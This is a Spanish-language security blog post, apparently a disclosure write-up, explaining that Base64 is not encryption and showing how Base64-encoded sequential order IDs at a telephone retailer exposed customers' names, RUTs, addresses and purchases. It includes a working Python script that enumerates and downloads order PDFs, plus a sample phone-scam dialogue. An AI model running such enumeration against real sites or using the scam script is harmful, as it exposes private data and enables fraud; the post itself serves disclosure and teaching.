---
title: "Hackeando Todas Las rdenes De Compra De Una Empresa De Telefona Base64 NO es un mtodo de encriptacin"
date: Fri, 28 Jun 2019 17:36:00 -0400
draft: false
type: posts
categories: 
- Base64,Fuga de Datos,Hacked,Hacking,Ingeniería Social,Noticias,Privacidad,Seguridad
---
# Hackeando Todas Las rdenes De Compra De Una Empresa De Telefona Base64 NO es un mtodo de encriptacin

<br/>

<br/>
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDqGBiqWr6rAzTefjHCKOYcPnXAuKGE3wqBasLfh43WqCZQSCOsYFLwu9LBemlnzMco7yQO37rBBAKPGosHJi1g1bly86-r4jrW4omLtYxbP3A_h9BClXqNXzmFL2dbhQWM1pMUH7YXh_1/s640/base64.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDqGBiqWr6rAzTefjHCKOYcPnXAuKGE3wqBasLfh43WqCZQSCOsYFLwu9LBemlnzMco7yQO37rBBAKPGosHJi1g1bly86-r4jrW4omLtYxbP3A_h9BClXqNXzmFL2dbhQWM1pMUH7YXh_1/s1600/base64.png)

  

Base64 es un sistema de numeración posicional que usa 64 como base. Es la mayor potencia de dos que puede ser representada usando únicamente los caracteres imprimibles de ASCII \[[1](https://es.wikipedia.org/wiki/Base64)\].

  

Todos los sistemas de numeración tienen una lista de símbolos que utilizan para representar valores, por ejemplo \[[2](https://varionet.wordpress.com/2009/11/06/sobre-base64-para-que-usarlo-para-que-no-y-como-manejarlo-en-net-y-asp-net/)\]:

  
Binario: **01**  
Decimal: **0123456789**  
Hexadecimal: **0123456789ABCDEF**  
y para **Base64** el conjunto es:  

```
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
```

  

La función para codificar en Base64 es biyectiva, lo que significa que existe una función que dado un texto encriptado en Base64, esta obtiene el texto original.

```
base64encode('blackploit') = 'YmxhY2twbG9pdA=='
base64decode('YmxhY2twbG9pdA==') = 'blackploit'
```

  

Base64 no es un método de encriptación. Si bien ofusca la información ante la vista normal, se puede obtener la información original muy fácilmente.

  

Base64 _pesa_ un 33% más que la información original. Esta relación está dada por la relación 8 a 6 bits por carácter, (o sea, un carácter de base64 representa menos información que un carácter normal).

  

Base64 es muy útil, y sus tres principales usos son:

-   Transmitir datos en codificaciones conocidas como ASCII o utf-8, sin tener problemas de compatibilidad entre sistemas, lo que permite transmitir binarios también.
-   Permite pasar a través de URLs caracteres raros o comodines como **#/^?** sin ser procesados por el navegador.
-   Puedes visualizar imágenes en Base64, por lo cual puedes guardar tus imágenes como texto en una base de datos y no como archivos en un sistema de ficheros.

  
Este emoji está en Base64: ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABt0lEQVQ4jZWTsWtTURTGf+e+mzYpCAZJIBE0piQUS7EgBbN06FDM8ob+CWKMW0fxT3CMiwaDf0GnLt2KdHlTQQeFVmxTRB2C0UESY17uc3g39eWFCPngDvee7zv3u+fcI8TQ36+sA3VgCyjY4zZwCDRTrvc2ypeIcAloAA8AFU9sYYDXwG7K9XqXCaz4ANicIYzjCKimXK83vqkxhxjLbQCIffPxf2zPggHuaqD+7sIo76Phyw/oDQKSC1DICMVMWKKzTkC7E/D7DywtCtfTUCkpdeemqkt3795J9dmw7Jv5rtcKDp4kTlUyQSGXniYogVZN06pplEzHc2lIJigoEWF7zZkiFLPCSl6xklcUs9MZttccRAQNtHc2VLn7K8AfwWIiXFu3/9X0qetw+MEwGMJgCNqBnQ0F0Jb+fuUF8HhM/tTR3Lrmo2I9MQbOv2uWM370+KUGmsAjbBv9ETx/c4XV3JAbaR8EPncd3n9b4P5qfyIn0Bz/xFfAw8tIEDr5+jOsTf7qiOWMHy9mK+V6NW03u0AZ+xuVQCnrU8pO2I3iyGpC23YwqkDLWpsFYznViWGKYt5x/gvnj4PS5kTD9gAAAABJRU5ErkJggg==)  

```
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABt0lEQVQ4jZWTsWtTURTGf+e+mzYpCAZJIBE0piQUS7EgBbN06FDM8ob+CWKMW0fxT3CMiwaDf0GnLt2KdHlTQQeFVmxTRB2C0UESY17uc3g39eWFCPngDvee7zv3u+fcI8TQ36+sA3VgCyjY4zZwCDRTrvc2ypeIcAloAA8AFU9sYYDXwG7K9XqXCaz4ANicIYzjCKimXK83vqkxhxjLbQCIffPxf2zPggHuaqD+7sIo76Phyw/oDQKSC1DICMVMWKKzTkC7E/D7DywtCtfTUCkpdeemqkt3795J9dmw7Jv5rtcKDp4kTlUyQSGXniYogVZN06pplEzHc2lIJigoEWF7zZkiFLPCSl6xklcUs9MZttccRAQNtHc2VLn7K8AfwWIiXFu3/9X0qetw+MEwGMJgCNqBnQ0F0Jb+fuUF8HhM/tTR3Lrmo2I9MQbOv2uWM370+KUGmsAjbBv9ETx/c4XV3JAbaR8EPncd3n9b4P5qfyIn0Bz/xFfAw8tIEDr5+jOsTf7qiOWMHy9mK+V6NW03u0AZ+xuVQCnrU8pO2I3iyGpC23YwqkDLWpsFYznViWGKYt5x/gvnj4PS5kTD9gAAAABJRU5ErkJggg==">
```

  

Esta larga introducción es para mostrarles que **Base64 NO es un método de encriptación**. Comprando un producto a través de una página de telefonía, me encontré con que usaban como método de "seguridad" pasar el _id_ de una orden de compra encriptada codificada a Base64, lo cual permitió una fuga generalizada de las órdenes de compra de esa empresa.

  

Aquí los dejo con el análisis de las vulnerabilidades:

  

**Vulnerabilidades**

**Vulnerabilidad 1 - Obtención de todas las órdenes de compra**

  

Una vez que se compra un producto en "empresa telefonía", se envía la orden de compra con un enlace con el siguiente formato:

**https://empresatelefonia.cl/fullprice/certificadopdforden?id=NDAwMDAxOTgyNQ==**

  

Como podemos notar el parámetro _**id**_ recibe algo en _Base64_, si lo decodificamos nos damos cuenta que es exactamente el _**id**_ de la compra:

**NDAwMDAxOTgyNQ== → 4000019825**

  

También podemos notar que la orden de compra es un número ascendente, que probablemente parte del 4000000000.

  

Para obtener todas la órdenes se crea un simple _script_ en _python_ que recorre las órdenes del 4000000000 al 4000200000 (empíricamente podemos notar que llegan hasta solo 4000019831 al momento de escribir este reporte), la orden se codifica a _Base64_ y se concatena con la _URL_ que genera la orden de compra:

  

```
import threading
import time
import requests
import base64
import sys
import os

START_IN = 4000000000
STOP_IN = 4000020000
THREADS = 5
SAVE_PATH = './orders'

class ThreadFunction(threading.Thread):
    def run(self):
        global START_IN
        while True:
            START_IN +=1
            if START_IN > STOP_IN:
                break
            order_number = str(START_IN)
            b64_order_number = base64.b64encode(order_number.encode('ascii')).decode("utf-8")
            url_order = 'https://empresatelefonia.cl/fullprice/certificadopdforden?id={}'.format(b64_order_number)
            r = requests.get(url_order)
            print('[{}] \t {} -> order: {}'.format(r.status_code, url_order, START_IN))
            if r.status_code == 200:
                with open('{}/{}.pdf'.format(SAVE_PATH, order_number), 'wb') as f:
                    f.write(r.content)
            else:
                continue

def main():
    if not os.path.exists(SAVE_PATH):
        os.makedirs(SAVE_PATH)
    if len(sys.argv) >= 2:
        global THREADS
        THREADS = int(sys.argv[1])
    if len(sys.argv) >= 3:
        global START_IN
        START_IN = int(sys.argv[2])
    if len(sys.argv) >= 4:
        global STOP_IN
        STOP_IN = int(sys.argv[3])
    for x in range(threads):
        mythread = ThreadFunction(name = "Thread-{}".format(x + 1))
        mythread.start()

if __name__ == '__main__':
    main()
```

  

Modo de uso:

```
python3 ordenes.py <n° de threads> <n° primera orden> <n° última orden>
```

  

Con este script se puede obtener 19783 órdenes de compra (510 MBs):

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg99LRWNoh5W1VyjbhyaBfRt4cYlRP5H9t3ZxDuvfcRfhvyEY-nWQll-6xMNvpR_ORwbUUPrIMm7Bb8hDInW9nOSZ4blOSbwwwiFVMfY8IddoBAfiauL9FB5Z5ymfWlDYS2NHKaNt-yAFSe/s640/ordenes_pdf.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg99LRWNoh5W1VyjbhyaBfRt4cYlRP5H9t3ZxDuvfcRfhvyEY-nWQll-6xMNvpR_ORwbUUPrIMm7Bb8hDInW9nOSZ4blOSbwwwiFVMfY8IddoBAfiauL9FB5Z5ymfWlDYS2NHKaNt-yAFSe/s1600/ordenes_pdf.png)

  

Los datos obtenidos son privados y en su conjunto, sensibles:

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgss7sJ1MnOgj1bg23urGrTM4XP5HcfoWZmQ0ehQLhjtTPigi57SP78ScjwPNsXBSDPgbC39MP9WbX0Llfq5NbAuYkYscABEkTMQYCN7YNDLCPzKJq5t39GBJtkf10xi2822nUsOI_vjkbF/s640/orden_datos.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgss7sJ1MnOgj1bg23urGrTM4XP5HcfoWZmQ0ehQLhjtTPigi57SP78ScjwPNsXBSDPgbC39MP9WbX0Llfq5NbAuYkYscABEkTMQYCN7YNDLCPzKJq5t39GBJtkf10xi2822nUsOI_vjkbF/s1600/orden_datos.png)

  

Datos:

-   Nombre
-   Apellido
-   RUT
-   Mail
-   Teléfono
-   Dirección
-   Producto y precio de compra

  

**Vulnerabilidad 2 - Sensitive Data Exposure**

  

Si se induce un error en la URL anterior, obtenemos un error demasiado verboso:

**https://empresatelefonia.cl/fullprice/certificadopdforden?id=jw==**

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhN26b3aK3qn4M99Ss5WbVz783zwA5IdjwCSZNkJ8DxthTCpEdufWHY1MHtcrildU5R6ENUr_iQAVJzzoSO1IkFcPStl-hKbVLQKQ7gLDMiajUFWjIbBTuPnT_jD3M-X04l10y2gbKu0FEV/s640/error.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhN26b3aK3qn4M99Ss5WbVz783zwA5IdjwCSZNkJ8DxthTCpEdufWHY1MHtcrildU5R6ENUr_iQAVJzzoSO1IkFcPStl-hKbVLQKQ7gLDMiajUFWjIbBTuPnT_jD3M-X04l10y2gbKu0FEV/s1600/error.png)

  

Datos obtenidos:

-   Ruta completa de la aplicación
-   Framework de programación

  

**Vulnerabilidad 3 - Confirmación de correo**

  

En la misma línea se encontró que el enlace para confirmar el correo, también pasa los datos codificados en _base64_, por ende fácilmente decodificable:

  

**https://empresatelefonia.cl/ValidacionMailAPP/Valida?token=cnV0PTE4OTk5OTk5LTAmbWFpbD1waWNob25AZ21haWwuY29tJmVudGlkYWQ9NTY5NSZlbnRpZGFkaWQ9MTA2MTIyOTQw**

  

**cnV0PTE4OTk5OTk5LTAmbWFpbD1waWNob25AZ21haWwuY29tJmVudGlkYWQ9NTY5NSZlbnRpZGFkaWQ9MTA2MTIyOTQw **→ rut=18999999-0&mail=pichon@gmail.com&entidad=5695&entidadid=106122940****

  

Más allá de que es una mala práctica pasar datos personales por método _GET_, se puede crear un _script_ que genere automáticamente el "_token_" de verificación de correo, bajo el supuesto de que el RUT y correo ya lo tenemos gracias a la vulnerabilidad anterior.

  

**Vulnerabilidad 4 - Demasiada información sin seguridad**

  

Con el siguiente enlace se puede obtener el seguimiento de una orden, lo que incluye el producto comprado.

**https://empresatelefonia.cl/seguimiento-despacho/resultados/index/orden/4000019747**

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhm0BPOIDFohT0cS1GPchn-pjHq6HSuHpc35-xSDt6twf-Tgi_FQkUFk_NlQjboCxVMvx0ZZR8cdHMA1A4IwsU5EDjjr0jgSE4f5kvpe7Q1Ncew6sLfullgMt4opYD8ymM6BhcpFtDvluW8/s640/seguimiento.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhm0BPOIDFohT0cS1GPchn-pjHq6HSuHpc35-xSDt6twf-Tgi_FQkUFk_NlQjboCxVMvx0ZZR8cdHMA1A4IwsU5EDjjr0jgSE4f5kvpe7Q1Ncew6sLfullgMt4opYD8ymM6BhcpFtDvluW8/s1600/seguimiento.png)

  

Esto quizás no parece una vulnerabilidad, pero se puede crear un script que vaya obteniendo los productos que vende la empresa en tiempo real, información muy útil para la competencia.

  

**Vectores de ataque**

  

**Vector de ataque 1 - Interceptación física**

  

Con la vulnerabilidad 1 y 4 se puede saber quién compra, dónde y cuándo va llegar el producto, por tanto un delincuente puede esperar a que llegue un repartidor para asaltarlo, ya que se sabe exactamente con que producto anda.

  

**Vector de ataque 2 - Estafa telefónica**

  

> **Delincuente**: Aló
> 
> **Víctima**: Hola
> 
> **Delincuente**: Estimado Rodrigo Perez, lo llamamos de Empresa Telefonía ya que se compró un teléfono iPhone X el día de ayer. ¿Cierto?
> 
> **Víctima**: Si
> 
> **Delincuente**: Queremos decirle que el celular que le costó $1.039.000 estaba en oferta y se le cobró de más, el precio real era de $690.000. ¿Sería tan amable de darnos su tarjeta de crédito para abonarle la diferencia?
> 
> **Víctima**: Claro

  

**Vector de ataque 3 - Cualquier tipo de ataque de ingeniería social**

  

Dado que se tienen muchos datos personales, en manos de delincuentes estos datos serían propicios para cometer una infinidad de delitos de ingeniería social.

  

**Mitigación**

  

Siempre que se deba pasar datos sensibles a través de un enlace, este debe ser un _token_ del _id_ original.

Se define como _token_ un _string_ alfanumérico único lo suficientemente largo para que no sea adivinable y que no exista una función matemática lineal que dado un _token_ se obtenga el _id_ original.

Existen muchas funciones generadoras de hash como _sha256_, _sha2_, _sha3_, etc... Para que sea un token seguro se recomienda usar valores aleatorios y una combinación de funciones de hash.

Por tanto lo que se debe hacer es crear por cada orden un _token_ y que los enlaces en la vulnerabilidad 1 y 4 reciban como parámetro ese _token_.

  

Ejemplo:

**https://empresatelefonia.cl/fullprice/certificadopdforden?id=abfae0f14c8a4c6d08bb618bf1955086**

**https://******empresatelefonia**.cl/seguimiento-despacho/resultados/index/orden/abfae0f14c8a4c6d08bb618bf1955086**

  

id\_orden

token\_orden

id\_cliente

...

4000019747

abfae0f14c8a4c6d08bb618bf1955086

231

...

4000019748

0fe44a966488ed7987d0c760d0699365

532

...

...

...

...

...

  

Exactamente lo mismo se debe hacer en la vulnerabilidad 3, donde se debe generar un _token_ único por usuario y pesarlo como parámetro el _token_ del usuario y no los datos.

_Base64_ no sirve para cifrar datos ya que solo lo codifica, es decir, existe una función que puede revertir la codificación y obtener los datos originales.

  

**Conclusión**

  

1.  Base64 NO es un método de encriptación.
2.  La empresa involucrada se comportó muy profesionalmente, me llamaron en menos de 48 horas del reporte, y repararon absolutamente todas las vulnerabilidades en menos de una semana, y eso que eran complicadas de resolver ya que tenían que cambiar el modelo de la base de datos. Además contaban con un área de Cyber Seguridad y no como un [banco que hablé en el pasado](https://www.blackploit.com/2018/04/hackeando-un-banco-caso-real-xss.html) que trató el problema como un ticket de servicio al cliente. Felicitaciones!
3.  Los datos obtenidos fueron con fines demostrativos y todas las órdenes obtenidas en el POC fueron eliminadas.

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgL82gfr8DlxcJupYtmYWN-vHDbYbnytQA4CWIvUSmCmYRp1i97dMgrkwV0y5IHbfWyrDs_qm2RMzr4a3DP9iy6oaOIdNYQIAyOx_8xr1setDOePBg8Jeyh4Sigb28BJdPOqQXRkXrgGHyj/s640/wiped.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgL82gfr8DlxcJupYtmYWN-vHDbYbnytQA4CWIvUSmCmYRp1i97dMgrkwV0y5IHbfWyrDs_qm2RMzr4a3DP9iy6oaOIdNYQIAyOx_8xr1setDOePBg8Jeyh4Sigb28BJdPOqQXRkXrgGHyj/s1600/wiped.png)

  

**Bibliografía**

  

1.  [https://es.wikipedia.org/wiki/Base64](https://es.wikipedia.org/wiki/Base64)
2.  [https://varionet.wordpress.com/2009/11/06/sobre-base64-para-que-usarlo-para-que-no-y-como-manejarlo-en-net-y-asp-net/](https://varionet.wordpress.com/2009/11/06/sobre-base64-para-que-usarlo-para-que-no-y-como-manejarlo-en-net-y-asp-net/)

  
Saludos ;)

#### [Source](http://www.blackploit.com/2019/06/hackeando-todas-las-ordenes-de-compra.html)

<br/>
---
